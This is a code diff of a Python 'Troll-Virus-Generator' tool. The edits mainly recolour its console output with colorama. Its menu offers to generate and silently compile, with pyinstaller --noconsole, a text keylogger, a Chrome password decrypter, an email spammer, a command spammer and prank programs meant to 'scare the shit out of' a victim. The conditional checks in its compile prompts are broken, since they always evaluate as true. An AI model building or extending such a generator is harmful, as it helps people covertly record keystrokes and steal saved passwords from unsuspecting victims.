@@ -2,6 +2,13 @@
 import os
 import socket
 try:
+    import colorama
+except ImportError:
+    os.system("py -m pip install colorama")
+
+from colorama import Fore, Style
+
+try:
     import pynput
 except ImportError:
     print("Pynput not found. Installing.")
@@ -25,7 +32,7 @@ import time
 
 
 os.system("cls")
-print("""\033[1;35;40m 
+print(Fore.LIGHTGREEN_EX+"""
 
                         _    _      _   _           __  __      _   _                      
             _/\_       | |  (_)__ _| |_| |_   ___  |  \/  |__ _| |_| |_ ___ _ _        _/\_
@@ -35,7 +42,7 @@ print("""\033[1;35;40m
 
                            || An Essential Program made for the Learning one ||  
                             ----------- || Version 2 || -------------
-    """)
+    """+Style.RESET_ALL)
 
 def __main__():
     #Definations.
@@ -55,17 +62,16 @@ def __main__():
         virus.close()
        
         print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
-        
-        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
+        exe = input(Fore.LIGHTWHITE_EX + "[?] Compile File now?(Requires pyinstaller) (Y/N) : " + Style.RESET_ALL)
         if(exe == "Y" or "y"):
             os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
-            print("\033[1;33;40mVirus Script Compiled Successfully.")
+            print(Fore.YELLOW + "[ + ] Virus Script Compiled Successfully." + Style.RESET_ALL)
             __main__()
         elif(exe == "N" or "n"):
-            print("\033[1;34;40m[+] Virus has been Created.")
+            print(Fore.LIGHTYELLOW_EX + "[+] Virus has been Created." + Style.RESET_ALL)
             __main__()
         else:
-            print("\033[1;31;40m[-] Error")
+            print(Fore.RED + "[-] Error" + Style.RESET_ALL)
             input("")
             __main__()
 
@@ -82,16 +88,17 @@ def __main__():
         print("[!] MagicDesktop Virus is Generated. Put your Background Image in the Same folder as MagicDesktop-Virus AND NAME IT \033[1;39;40mimage \033[1;32;40mit will Work in 20 Seconds..")
         print("[!] FILE EXITS",os.path.isfile(file+".pyw"))
 
-        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
+        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
+        exe = input(Fore.LIGHTWHITE_EX + "[?] Compile File now?(Requires pyinstaller) (Y/N) : " + Style.RESET_ALL)
         if(exe == "Y" or "y"):
             os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
-            print("\033[1;33;40mVirus Script Compiled Successfully.")
+            print(Fore.YELLOW + "[ + ] Virus Script Compiled Successfully." + Style.RESET_ALL)
             __main__()
         elif(exe == "N" or "n"):
-            print("\033[1;34;40m[+] Virus has been Created.")
+            print(Fore.LIGHTYELLOW_EX + "[+] Virus has been Created." + Style.RESET_ALL)
             __main__()
         else:
-            print("\033[1;31;40m[-] Error")
+            print(Fore.RED + "[-] Error" + Style.RESET_ALL)
             input("")
             __main__()
 
@@ -110,18 +117,20 @@ def __main__():
         virus.close()
        
         print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
-        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
+        exe = input(Fore.LIGHTWHITE_EX + "[?] Compile File now?(Requires pyinstaller) (Y/N) : " + Style.RESET_ALL)
         if(exe == "Y" or "y"):
             os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
-            print("\033[1;33;40mVirus Script Compiled Successfully.")
+            print(Fore.YELLOW + "[ + ] Virus Script Compiled Successfully." + Style.RESET_ALL)
             __main__()
         elif(exe == "N" or "n"):
-            print("\033[1;34;40m[+] Virus has been Created.")
+            print(Fore.LIGHTYELLOW_EX + "[+] Virus has been Created." + Style.RESET_ALL)
             __main__()
         else:
-            print("\033[1;31;40m[-] Error")
+            print(Fore.RED + "[-] Error" + Style.RESET_ALL)
             input("")
             __main__()
+
+
 
     def TrollText():
         file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
@@ -141,18 +150,19 @@ def __main__():
         virus.close()
        
         print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
-        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
+        exe = input(Fore.LIGHTWHITE_EX + "[?] Compile File now?(Requires pyinstaller) (Y/N) : " + Style.RESET_ALL)
         if(exe == "Y" or "y"):
             os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
-            print("\033[1;33;40mVirus Script Compiled Successfully.")
+            print(Fore.YELLOW + "[ + ] Virus Script Compiled Successfully." + Style.RESET_ALL)
             __main__()
         elif(exe == "N" or "n"):
-            print("\033[1;34;40m[+] Virus has been Created.")
+            print(Fore.LIGHTYELLOW_EX + "[+] Virus has been Created." + Style.RESET_ALL)
             __main__()
         else:
-            print("\033[1;31;40m[-] Error")
+            print(Fore.RED + "[-] Error" + Style.RESET_ALL)
             input("")
             __main__()
+
 
 
     def TrollURL():
@@ -170,18 +180,19 @@ def __main__():
         virus.write("  openURL()\n")
         virus.close()
         print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
-        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
+        exe = input(Fore.LIGHTWHITE_EX + "[?] Compile File now?(Requires pyinstaller) (Y/N) : " + Style.RESET_ALL)
         if(exe == "Y" or "y"):
             os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
-            print("\033[1;33;40mVirus Script Compiled Successfully.")
+            print(Fore.YELLOW + "[ + ] Virus Script Compiled Successfully." + Style.RESET_ALL)
             __main__()
         elif(exe == "N" or "n"):
-            print("\033[1;34;40m[+] Virus has been Created.")
+            print(Fore.LIGHTYELLOW_EX + "[+] Virus has been Created." + Style.RESET_ALL)
             __main__()
         else:
-            print("\033[1;31;40m[-] Error")
+            print(Fore.RED + "[-] Error" + Style.RESET_ALL)
             input("")
             __main__()
+
 
     def txtKeylog():
         file = input("[!] Enter file name (Enter ONLY file name not it's TYPE! Eg : file | not file.txt) : ")
@@ -202,37 +213,37 @@ def __main__():
         virus.close()
 
         print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
-        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
+        exe = input(Fore.LIGHTWHITE_EX + "[?] Compile File now?(Requires pyinstaller) (Y/N) : " + Style.RESET_ALL)
         if(exe == "Y" or "y"):
             os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
-            print("\033[1;33;40mVirus Script Compiled Successfully.")
+            print(Fore.YELLOW + "[ + ] Virus Script Compiled Successfully." + Style.RESET_ALL)
             __main__()
         elif(exe == "N" or "n"):
-            print("\033[1;34;40m[+] Virus has been Created.")
+            print(Fore.LIGHTYELLOW_EX + "[+] Virus has been Created." + Style.RESET_ALL)
             __main__()
         else:
-            print("\033[1;31;40m[-] Error")
+            print(Fore.RED + "[-] Error" + Style.RESET_ALL)
             input("")
             __main__()
 
     def virus():
-        print("[+] Available Modules : ")
-        print("\033[1;37;40mSelect Virus Type : ")
-        print("\033[1;34;40m[*] All the Stuff for People Learning :")
-        print("\033[1;33;40m[1] MagicText - Automatically Writes Text every 10 Seconds to Scare the shit out of Victim.")
+        print(Fore.LIGHTGREEN_EX + "[+] Available Modules : " + Style.RESET_ALL)
+        print(Fore.LIGHTMAGENTA_EX + "[-] Select Virus Type : " + Style.RESET_ALL)
+        print(Fore.LIGHTWHITE_EX + "[*] All the Stuff for People Learning :" + Style.RESET_ALL)
+        print(Fore.LIGHTCYAN_EX + "[1] MagicText - Automatically Writes Text every 10 Seconds to Scare the shit out of Victim.")
         print("[2] MagicDesktop - Automatically Changes Desktop Wallpaper from time to time.")
         print("[3] MagicClicks - Automatically Right/Left Click to Scare the shit out of Victim.")
         print("[4] TrollText - Display random Message Boxes")
         print("[5] TrollURL - Automatically open a Specified URL.")
         print("[6] Normal log to .txt Keylogger")
-        print("\033[1;34;40m[*] For Hackers : ")
-        print("\033[1;33;40m[7] Anti-Chrome - Decrypt your Chrome Passwords.")
+        print("[*] For Hackers : ")
+        print("[7] Anti-Chrome - Decrypt your Chrome Passwords.")
         print("[8] Ded Virus Command Line Spammer - Python Version.")
         print("[9] Email Spammer - GMAIL")
-        print("[10] A Fake 'You've BEEN HACKED' Application with Graphical User Interface.")
-        print("\033[1;34;40m[*] Local and Remote Exploits : ")
-        print("\033[1;33;40m[*] Coming in Version 3.")
-        type = input("\033[1;32;40mFastCorp>\033[1;37;40m$~/Virus Type : \033[1;32;40m")
+        print("[10] A Fake 'You've BEEN HACKED' Application with Graphical User Interface." + Style.RESET_ALL)
+        print("[*] Local and Remote Exploits : ")
+        print("[*] Coming in Version 3.")
+        type = input(Fore.LIGHTGREEN_EX + "FastCorp>"+ Fore.LIGHTYELLOW_EX + "$~/Virus Type : " + Style.RESET_ALL)
         if(type == "1"):
             print("[*] You have selected type MagicText.")
             print("[+] Now starting Virus Generation.")
@@ -364,7 +375,7 @@ def __main__():
             __main__()
 
     #All the Work THIS IS __MAIN__
-    cmd = input("\033[1;32;40mFastCorp>")
+    cmd = input(Fore.LIGHTGREEN_EX + "FastCorp>" + Style.RESET_ALL)
     if(cmd == "help"):
         print("[*] Troll-Virus-Generator")
         print("[+] HELP : ")
@@ -380,7 +391,7 @@ def __main__():
         exit
     elif(cmd == "info"):
         print("*_ Light Matter _*")
-        print("Coded by : F.A.S.T")
+        print("Coded by : Lynx")
         input("")
         __main__()
     else:
